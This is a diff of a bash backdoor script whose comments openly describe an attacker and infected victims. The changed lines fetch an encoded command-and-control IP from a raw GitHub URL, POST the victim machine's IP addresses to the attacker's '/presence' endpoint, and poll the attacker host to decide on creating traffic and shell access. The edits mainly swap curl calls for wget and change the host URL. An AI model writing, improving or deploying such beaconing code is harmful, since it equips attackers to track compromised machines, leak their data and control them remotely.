@@ -13,7 +13,6 @@ function check_if_installed {
   fi
 }
 
-
 # Only for first installation
 DEBUG_MODE=$(check_if_installed)
 
@@ -22,7 +21,7 @@ DEBUG_MODE=$(check_if_installed)
 SLEEP_TIME=20
 
 # GET ENCRYPTED IP FROM THIS LINK
-URL="https://raw.githubusercontent.com/erucix/-/main/ip.txt"
+URL="https://raw.githubusercontent.com/rohitaryal/-/main/ip.txt"
 
 # Get saved encoded IP from somewhere
 # Keep it far from you and controllable
@@ -31,7 +30,7 @@ URL="https://raw.githubusercontent.com/erucix/-/main/ip.txt"
 # ip(attacker's) for the infected victims
 function get_ip {
 
-  RESPONSE=$(curl -s --fail $URL)
+  RESPONSE=$(wget -q -O - $URL)
 
   if [ $? -ne 0 ]
   then
@@ -115,7 +114,7 @@ function send_presence {
     if [ "$TRAFFIC_STATUS" = "true" ]
     then
       ATTACKER_IP=$1
-      PRESENCE_RESPONSE=$(curl -s --fail -X POST http://$ATTACKER_IP:$ATTACKER_PORT/presence -d $(hostname -I))
+      PRESENCE_RESPONSE=$(wget -q http://$ATTACKER_IP:$ATTACKER_PORT/presence --post-data="$(hostname -I)" -O -)
 
       if [ ! "$PRESENCE_RESPONSE" = "ACK" ]
       then
@@ -131,11 +130,11 @@ function send_presence {
 # to reduce unwanted noise and prevent unwanted shell access
 # Creates traffic if you respond with anything other
 # than "NO" or you dont respond at all (good thing)
-# This is where '/' (POST REQ) comes in
+# This is where '/' (GET REQ) comes in
 function should_create_traffic {
   ATTACKER_IP=$1
 
-  RESPONSE=$(curl -s --fail http://$ATTACKER_IP:$ATTACKER_PORT)
+  RESPONSE=$(wget -q http://$ATTACKER_IP:$ATTACKER_PORT -O -)
 
   if [[ $RESPONSE = "NO" && $? -ne 0 ]]
   then
